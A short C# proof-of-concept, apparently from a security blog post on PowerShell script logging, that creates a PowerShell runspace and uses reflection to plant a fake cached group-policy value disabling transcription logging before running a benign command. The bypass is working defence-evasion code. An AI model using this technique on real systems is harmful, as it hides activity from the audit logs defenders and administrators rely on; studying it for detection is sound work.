https://avantguard.io/en/BlogScriptLogging/

using System;
using System.Reflection;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;

namespace CustomRunspace
{
    class CustomRunspace
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();

            // Transcription Logging Bypass
            BindingFlags bf = BindingFlags.NonPublic | BindingFlags.Static;
            ConcurrentDictionary<string, Dictionary<string, object>> value = (ConcurrentDictionary<string, Dictionary<string, object>>) rs.GetType().Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings", bf).GetValue(null);
            Dictionary<string, object> dic = new Dictionary<string, object>();
            dic.Add("EnableTranscripting", "0");
            value.GetOrAdd("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", dic);
            
            // Open Runspace, cachedGroupPolicySettings seem to be read now
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddCommand("Get-Runspace");

            Collection<PSObject> results = ps.Invoke();
            foreach (var result in results)
            {
                Console.WriteLine(result);
            }
            rs.Close();
        }
    }
